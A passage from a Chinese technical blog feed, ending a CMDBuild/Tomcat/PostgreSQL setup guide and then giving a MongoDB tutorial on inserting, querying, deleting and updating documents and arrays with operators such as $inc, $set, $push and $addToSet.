extras/tomcat-libs/6.0\ or\ higher/postgresql-9.4.1207.jar /usr/<span class="built_in">local</span>/tomcat7/lib/</span><br></pre></td></tr></table></figure>

<h2 id="设置PostgreSQL"><a href="#设置PostgreSQL" class="headerlink" title="设置PostgreSQL"></a>设置PostgreSQL</h2><p>PostgreSQL安装略</p>
<h3 id="设置pg-hba-conf"><a href="#设置pg-hba-conf" class="headerlink" title="设置pg_hba.conf"></a>设置pg_hba.conf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /var/lib/pgsql/9.6/data/pg_hba.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># "local" is for Unix domain socket connections only</span></span><br><span class="line"><span class="built_in">local</span>   all             all                                     md5</span><br><span class="line"><span class="comment"># IPv4 local connections:</span></span><br><span class="line">host    all             all             127.0.0.1/32            md5</span><br><span class="line"></span><br><span class="line">systemctl restart postgresql-9.6</span><br></pre></td></tr></table></figure>

<h3 id="创建cmdbuild数据库与账号"><a href="#创建cmdbuild数据库与账号" class="headerlink" title="创建cmdbuild数据库与账号"></a>创建cmdbuild数据库与账号</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - postgres</span><br><span class="line"></span><br><span class="line">-bash-4.2$ psql</span><br><span class="line">postgres=<span class="comment"># create user cmdbadmin with password 'cmdbadmin@123';</span></span><br><span class="line">postgres=<span class="comment"># create database cmdbuild owner cmdbadmin;</span></span><br><span class="line">postgres=<span class="comment"># grant all privileges on database cmdbuild to cmdbadmin;</span></span><br></pre></td></tr></table></figure>

<h3 id="导入数据表"><a href="#导入数据表" class="headerlink" title="导入数据表"></a>导入数据表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此数据表是cmdb安装包中自带的1个demo表；</span></span><br><span class="line"><span class="comment">#注意导入的数据库</span></span><br><span class="line">su - postgres</span><br><span class="line"></span><br><span class="line">-bash-4.2$ psql -U cmdbadmin -d cmdbuild -f /usr/<span class="built_in">local</span>/tomcat7/webapps/cmdbuild/WEB-INF/sql/sample_schemas/demo_schema.sql</span><br><span class="line">Password <span class="keyword">for</span> user cmdbadmin:</span><br></pre></td></tr></table></figure>

<h3 id="重启tomcat"><a href="#重启tomcat" class="headerlink" title="重启tomcat"></a>重启tomcat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#重启cmdb后生效，可在部署cmdb包到tomcat之后直接重启</span></span><br><span class="line">-bash-4.2$ <span class="built_in">exit</span></span><br><span class="line">catalina.sh stop</span><br><span class="line">systemctl start tomcat</span><br></pre></td></tr></table></figure>

<h2 id="初始化cmdb"><a href="#初始化cmdb" class="headerlink" title="初始化cmdb"></a>初始化cmdb</h2><p>浏览器访问：<a href="http://ip:8080/cmdbuild/" target="_blank" rel="noopener">http://ip:8080/cmdbuild/</a></p>
<p>登录后设置数据库</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Cmdb</tag>
      </tags>
  </entry>
  <entry>
    <title>MongodDB[三]:基本操作</title>
    <url>/articles/19a8cfc5.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文介绍MongoDB的基本操作，包括文档的创建、删除、和更新。</p>
<a id="more"></a>

<h2 id="文档插入"><a href="#文档插入" class="headerlink" title="文档插入"></a>文档插入</h2><p><strong>1、插入</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看当前都有哪些数据库</span><br><span class="line">&gt; show dbs;</span><br><span class="line">local  0.000GB</span><br><span class="line">tim    0.000GB</span><br><span class="line">#使用 tim数据库</span><br><span class="line">&gt; use tim;</span><br><span class="line">switched to db tim</span><br><span class="line">#查看都有哪些集合</span><br><span class="line">&gt; show collections;</span><br><span class="line">user</span><br><span class="line">&gt; db.user.in</span><br><span class="line">db.user.initializeOrderedBulkOp(    db.user.insert(                     db.user.insertOne(</span><br><span class="line">db.user.initializeUnorderedBulkOp(  db.user.insertMany(</span><br><span class="line">#使用insert方法插入文档，以&#123;&#125;包注，文档是以键值对出现的，必须成对设置</span><br><span class="line">&gt; db.user.insert(&#123;&quot;uid&quot;:1,&quot;name&quot;:&quot;luotianshuai&quot;,&quot;age&quot;:18,&quot;salary&quot;:1&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2、查询</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过find()方法进行查询</span><br><span class="line">&gt; db.user.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f039f0c73a5a96e8f7c8f&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;age&quot; : 18, &quot;salary&quot; : 1 &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>3、如何快速构造1万条文档呢？</strong></p>
<p>可以通过json的循环来实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; for(i=2;i&lt;=20;i++)&#123;</span><br><span class="line">... db.user.insert(&#123;&quot;uid&quot;:i,&quot;name&quot;:&quot;luotianshuai&quot;+i,&quot;salary&quot;:2000+Math.round(Math.random())*5000&#125;)</span><br><span class="line">... &#125;</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<p>插入一条文档使用insert方法</p>
<p>文档的规则是键值对，他们是成对出现的他们之间用逗号分隔，键和值通过冒号分隔。</p>
<h2 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h2><p><strong>1、查询所有</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#db.user.find() 如果括号内不加任何条件那么默认是显示所有的文档</span><br></pre></td></tr></table></figure>

<p><strong>2、查询条件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.find(&#123;&quot;uid&quot;:1&#125;) #这里指定条件</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f039f0c73a5a96e8f7c8f&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;age&quot; : 18, &quot;salary&quot; : 1 &#125;</span><br></pre></td></tr></table></figure>

<p><strong>3、删除文档</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.remove(&#123;&quot;uid&quot;:1&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nRemoved&quot; : 1 &#125;)  #当removed为1的时候说明删除成功</span><br></pre></td></tr></table></figure>

<p><strong>4、清空集合</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.remove(&#123;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nRemoved&quot; : 19 &#125;)</span><br></pre></td></tr></table></figure>

<p><strong>5、删除集合</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.drop()</span><br><span class="line">true  #如果返回true说明删除成功</span><br></pre></td></tr></table></figure>

<h2 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h2><p>先把之前删除掉饿文档创建一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(i=2;i&lt;=20;i++)&#123; db.user.insert(&#123;&quot;uid&quot;:i,&quot;name&quot;:&quot;luotianshuai&quot;+i,&quot;salary&quot;:2000+Math.round(Math.random())*5000&#125;) &#125;</span><br></pre></td></tr></table></figure>

<p><strong>1、更新文档</strong></p>
<p>更新文档这里通过update方法括号内，第一个文档为查询的文档，第二个文档为修改为什么文档！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:2&#125;,&#123;&quot;name&quot;:&quot;shuaige&quot;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure>

<p>通过查看这种更新方式，后面的文档会覆盖我们要修改文档的整个内容，就变成下面的内容了。uid字段salary字段都被覆盖掉了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca3&quot;), &quot;name&quot; : &quot;shuaige&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>所以用下面的方法可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;  db.user.update(&#123;&quot;uid&quot;:3&#125;,&#123;&quot;uid&quot; : 3, &quot;name&quot; : &quot;shuaige&quot;, &quot;salary&quot; : 2000 &#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne(&#123;&quot;uid&quot;:3&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca4&quot;),</span><br><span class="line">        &quot;uid&quot; : 3,</span><br><span class="line">        &quot;name&quot; : &quot;shuaige&quot;,</span><br><span class="line">        &quot;salary&quot; : 2000</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到这个更新结果是我们想要的结果，这种方式叫做文档的替换方式更新！</p>
<p>但是我们uid不需要变更，salary也不需要变更但是我们都要写出来！</p>
<p><strong>2、变量替换方式</strong></p>
<p>我们可以把取出来的值赋值给一个变量，然后通过变量去修改！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#把查询到的值赋值给a</span><br><span class="line">&gt; a = db.user.findOne(&#123;&quot;uid&quot;:4&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca5&quot;),</span><br><span class="line">        &quot;uid&quot; : 4,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai4&quot;,</span><br><span class="line">        &quot;salary&quot; : 7000</span><br><span class="line">&#125;</span><br><span class="line">&gt; a.name</span><br><span class="line">luotianshuai4</span><br><span class="line">#通过变量.字段名去修改字段的内容</span><br><span class="line">&gt; a.name=&quot;dashuaige&quot;</span><br><span class="line">dashuaige</span><br><span class="line">&gt; db.user.findOne(&#123;&quot;uid&quot;:4&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca5&quot;),</span><br><span class="line">        &quot;uid&quot; : 4,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai4&quot;,</span><br><span class="line">        &quot;salary&quot; : 7000</span><br><span class="line">&#125;</span><br><span class="line">#然后在通过update更新</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:4&#125;,a)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne(&#123;&quot;uid&quot;:4&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca5&quot;),</span><br><span class="line">        &quot;uid&quot; : 4,</span><br><span class="line">        &quot;name&quot; : &quot;dashuaige&quot;,</span><br><span class="line">        &quot;salary&quot; : 7000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他的本质还是替换的方式，只不过是方便了</p>
<p><strong>3、使用修改器$inc更新</strong></p>
<p>如何对uid为10的用户增加100块钱工资</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这里$inc遵循键值对的规则，他相当于键，要修改的内容为值</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:100&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7100 &#125;</span><br><span class="line"></span><br><span class="line">#减100</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:-100&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7000 &#125;</span><br></pre></td></tr></table></figure>

<p><strong>4、添加一个字段$set修改器</strong></p>
<p>有时候有需求要给某个文档添加一个字段，比如年龄。使用$set</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#添加器$set</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$set&quot;:&#123;&quot;age&quot;:18&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7000, &quot;age&quot; : 18 &#125;</span><br></pre></td></tr></table></figure>

<p><strong>5、删除一个字段$unset修改器</strong></p>
<p>有时候有需求要求给某个文档删除一个字段，比如年龄。使用$unset</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这里注意使用unset的时候他的值也是一个字典要删除的字段:1 这个1，是true的意思删除它，所以这个1是逻辑的true</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$unset&quot;:&#123;&quot;age&quot;:1&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7000 &#125;</span><br></pre></td></tr></table></figure>

<p>看上面使用$unset的时候age的值为1说明为true那我们也可以通过值为true来删除它，那么我们来删除uid为10的salary字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#例子</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$unset&quot;:&#123;&quot;salary&quot;:true&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">结果：</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot; &#125;</span><br></pre></td></tr></table></figure>

<p><strong>6、更新文档的其他参数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.update(&#123;arg1&#125;,&#123;arg2&#125;,arg3,arg4)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">参数1:条件     #通过他来查找</span><br><span class="line">参数2:需要操作的更新内容      #把找到的文档修改</span><br><span class="line">参数3:</span><br><span class="line">参宿4:</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#参数3是做什么呢？</span><br><span class="line">咱们看下下面一种情况：</span><br><span class="line">如果我现在想更新一条数据uid为100，我这里是没有这个uid为100的文档的</span><br><span class="line">&gt; db.user.find(&#123;&quot;uid&quot;:100&#125;) #为空</span><br><span class="line">那么现在我修改他下那么会成功的修改吗？</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:100&#125;,&#123;&quot;uid&quot;:100,&quot;name&quot;:&quot;luotianshuai100&quot;,&quot;salary&quot;:100&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)</span><br><span class="line">#看上面的提示找到0，修改0，说明没有更新，那么第3个参数的作用就来了，给他设置为true</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:100&#125;,&#123;&quot;uid&quot;:100,&quot;name&quot;:&quot;luotianshuai100&quot;,&quot;salary&quot;:100&#125;,true)</span><br><span class="line">WriteResult(&#123;</span><br><span class="line">        &quot;nMatched&quot; : 0,</span><br><span class="line">        &quot;nUpserted&quot; : 1, #当查找不到的时候，我们插入它</span><br><span class="line">        &quot;nModified&quot; : 0,</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f12ee7732f402fffdf61b&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">&gt; </span><br><span class="line">#查看下,他更新成功了</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;575f12ee7732f402fffdf61b&quot;), &quot;uid&quot; : 100, &quot;name&quot; : &quot;luotianshuai100&quot;, &quot;salary&quot; : 100 &#125;</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">so  那么第三个参数的含义就展现出来了，如果查找不到条件，那么就插入我们修改的内容</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#参数4的含义</span><br><span class="line">现在有个需求我现在需要给所有的员工加10000块钱，来看下我的操作</span><br><span class="line">&gt; db.user.update(&#123;&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:1000&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">#可以看到他只更新了匹配到的第一条数据那么，第4个参数的作用就来了</span><br><span class="line">&gt; db.user.update(&#123;&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:1000&#125;&#125;,false,true)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 20, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 20 &#125;)</span><br><span class="line">&gt; </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">从上面可以看出，第四个参数的作用就是设置为true的时候就是匹配所有文档</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<p><strong>第3个和第4个参数默认为false</strong></p>
<p><strong>第一个为查找的条件，第二个为修改内容，第三个是是否在查不到的时候添加修改内容，第四个是是否匹配所有。</strong></p>
<h2 id="更新文档中的文档和更新文档中的数组"><a href="#更新文档中的文档和更新文档中的数组" class="headerlink" title="更新文档中的文档和更新文档中的数组"></a>更新文档中的文档和更新文档中的数组</h2><p>用Python理解的话就是字典中的字典和，字典中的列表~~！</p>
<p>先创建一个文档，然后通过修改他来实际看下如何修改文档中的文档和文档中的数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.insert(&#123;&quot;uid&quot;:1,&quot;name&quot;:&quot;luotianshuai&quot;,&quot;content&quot;:&#123;&quot;addr&quot;:&quot;beijing&quot;,&quot;code&quot;:10085,&quot;qq&quot;:&quot;1234567&quot;&#125;,&quot;email&quot;:[]&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f19c45e4f17980e7b3366&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [ ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>一、数组的更新</strong></p>
<p><strong>1、数组增加元素$push</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$push&quot;:&#123;&quot;email&quot;:&quot;a&quot;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f19c45e4f17980e7b3366&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;a&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>$push 是在元组中增加一个元素,会在数组的最后追加元素</p>
<p><strong>2、$pushAll</strong> 在元组中增加多个元素,但是他不检查元素是否存在</p>
<p>如下：b已经存在了，我再同时增加b,c,d看下是什么结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$push&quot;:&#123;&quot;email&quot;:&quot;b&quot;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f1b9a5e4f17980e7b3367&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;a&quot;,</span><br><span class="line">                &quot;b&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>$pushAll</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$pushAll&quot;:&#123;&quot;email&quot;:[&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f1b9a5e4f17980e7b3367&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;a&quot;,</span><br><span class="line">                &quot;b&quot;,</span><br><span class="line">                &quot;b&quot;,</span><br><span class="line">                &quot;c&quot;,</span><br><span class="line">                &quot;d&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>3、$addToSet</strong> <strong>往数组中添加一个不重复的元素</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$addToSet&quot;:&#123;&quot;email&quot;:&quot;d&quot;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)</span><br><span class="line">&gt; </span><br><span class="line">#从上面的结果可以看出匹配到了一个，插入和修改了0个，说明他可以判断元素是否存在</span><br></pre></td></tr></table></figure>

<p>添加一个元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#如果不存在就创建</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$addToSet&quot;:&#123;&quot;email&quot;:&quot;e&quot;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>添加多个不重复的元素，这时候就得需要用到<strong>$eache</strong>操作符了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这里e,d都是存在的然后g，f是不存在的批量插入看下结果</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$addToSet&quot;:&#123;&quot;email&quot;:&#123;&quot;$each&quot;:[&quot;e&quot;,&quot;g&quot;,&quot;f&quot;,&quot;d&quot;]&#125;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f1b9a5e4f17980e7b3367&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;a&quot;,</span><br><span class="line">                &quot;b&quot;,</span><br><span class="line">                &quot;b&quot;,</span><br><span class="line">                &quot;c&quot;,</span><br><span class="line">                &quot;d&quot;,</span><br><span class="line">                &quot;e&quot;,</span><br><span class="line">                &quot;g&quot;,</span><br><span class="line">                &quot;f&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<p><strong>db.user.update({“uid”:1},{“$push”:{“email”:”a”}})  #在数组末尾添加一个元素</strong></p>
<p><strong>db.user.update({“uid”:1},{“$pushAll”:{“email”:[“b”,”c”,”d”]}}) #在数组末尾添加多个元素，且并不检查是否重复</strong></p>
<p><strong>db.user.update({“uid”:1},{“$addToSet”:{“email”:”d”}}) #向数组添加一个不重复的元素</strong></p>
<p>#在实际的生产中可能需要插入多个不重复的元素可以使用<strong>$addToSet</strong> 结合<strong>$eache</strong>操作符</p>
<p><strong>db.user.update({“uid”:1},{“$addToSet”:{“email”:{“$each”:[“e”,”g”,”f”,”d”]}}})</strong></p>
<p><strong>二、删除数组元素</strong></p>
<p><strong>1、$pop 从数组中1个值，只能从开头和结尾取值</strong></p>
<p>$pop是从数组中的开头和结尾删除一个值</p>
<p><img src="/articles/19a8cfc5/1.png" alt="image-20190716174349074"></p>
<p>从上面的结果可以看出，$pop操作符的值中数组的值，为正数的时候从数组的右侧删值，为负数的时候从数组的左侧取值</p>
<p><strong>2、$pull删除指定的数组指定的一个元素</strong></p>
<p><img src="/articles/19a8cfc5/2.png" alt="image-20190716174811157"></p>
<p><strong>3、$pullAll 删除多个指定的数组元素</strong></p>
<p><img src="/articles/19a8cfc5/3.png" alt="image-20190716175312608"></p>
<p><strong>总结：</strong></p>
<p><strong>db.user.update({“uid”:1},{“$pop”:{“email”:-1}}) #从左侧删除一个元素</strong></p>
<p><strong>db.user.update({“uid”:1},{“$pop”:{“email”:1}})#从右侧删除一个元素</strong></p>
<p><strong>db.user.update({“uid”:1},{“$pull”:{“email”:”b”}}) #删除数组内的指定一个元素</strong></p>
<p><strong>db.user.update({“uid”:1},{“$pullAll”:{“email”:[“b”,”c”]}}) #删除数组内指定的多个元素</strong></p>
<p><strong>三、数组元素的更新</strong></p>
<p><strong>1、通过变量调用下标修改</strong></p>
